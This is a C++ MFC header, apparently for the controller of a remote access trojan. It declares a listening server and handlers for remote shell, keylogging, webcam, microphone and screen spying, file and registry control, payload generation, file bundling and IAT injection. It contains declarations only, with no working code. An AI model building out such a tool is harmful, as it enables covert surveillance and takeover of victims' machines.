
// nbclassDlg.h: 头文件
//

#pragma once
#include"SEU_QQwry.h"
#include"IOCPServer.h"
// CnbclassDlg 对话框
class CnbclassDlg : public CDialogEx
{
// 构造
public:
	CnbclassDlg(CWnd* pParent = nullptr);	// 标准构造函数
	void	Activate(UINT nPort, UINT nMaxConnections);	// 监听端口
	void ShowLog(LPCTSTR type, LPCTSTR Text, int imgIndex);
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_NBCLASS_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	DWORD WindowsTitle = TRUE;
	HICON m_hIcon;
	NOTIFYICONDATA nid;
	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	int nOSCount[9] = { 0 };        //系统分类
	CListCtrl m_ConnectList;
	CListCtrl m_LogList;
	afx_msg void OnSize(UINT nType, int cx, int cy);
protected:
	void InitView();
	CStatusBar m_wndStatusBar;
	CMenu m_Menu;
	SEU_QQwry* m_QQwry;		// 识别IP区域
	DWORD Index = 0;
private:
	BOOL FileCheck(PBYTE buff);
	static DWORD isTitleName(CnbclassDlg* windows);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode); // 接收到的数据的处理都要调用这个回调函数
	static void ProcessReceiveComplete(ClientContext* pContext);
	static void ProcessReceive(ClientContext* pContext);
	void SendSelectCommand(PBYTE pData, UINT nSize);
	void SendSelectCommandPuls(BYTE Falg);
public:
	afx_msg void OnNMRClickLogview(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnNMRClickConnectview(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnLogClear();
	afx_msg void OnLogDeleteSelect();
	afx_msg void OnSetConfig();
protected:
	afx_msg LRESULT OnAddtolist(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnShell();
protected:
	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnConnectBeiZhu();
	afx_msg void OnRemove();
protected:
	afx_msg LRESULT OnRemovefromlist(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnSystem();
protected:
	afx_msg LRESULT OnOpenpslistdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenpserlistdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnServer();

protected:
	afx_msg LRESULT OnOpenregeditdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOnopenscreenspydialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnSoundPut();
	afx_msg void OnSoundPop();
protected:
	afx_msg LRESULT OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenaudiodialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnConnectVideo();
protected:
	afx_msg LRESULT OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnSysInfo();
protected:
	afx_msg LRESULT OnOpensysinfodialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnScreenshots();
	afx_msg void OnTask();
protected:
	afx_msg LRESULT OnOpentaskdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnLookSpy();
	afx_msg void OnReg();
	afx_msg void OnFile();
	afx_msg void OnShutdown();
	afx_msg void OnReboot();
	afx_msg void OnLogoff();
	afx_msg void OnGenerate();
protected:
	afx_msg LRESULT OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnConnectKey();
	afx_msg void OnFileBundle();
	afx_msg void OnDesktop();
protected:
	afx_msg LRESULT OnOpendesktopspydialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnToolsclass(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnNotifyMain(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnTuopanExit();
	afx_msg void OnClose();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void Onabout();
	afx_msg void OnShowCommand();
	afx_msg void OnOpenTask();
	afx_msg void OnDelTask();
	afx_msg void OnOpenDef();
	afx_msg void OnCloseDef();
	afx_msg void OnSetGroup();

	afx_msg void OnIATinjection();
	afx_msg void OnLvnColumnclickConnectview(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnConnectOldSrc();
protected:
	afx_msg LRESULT OnOpenoldscreenspydialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnUpdateClient();
};
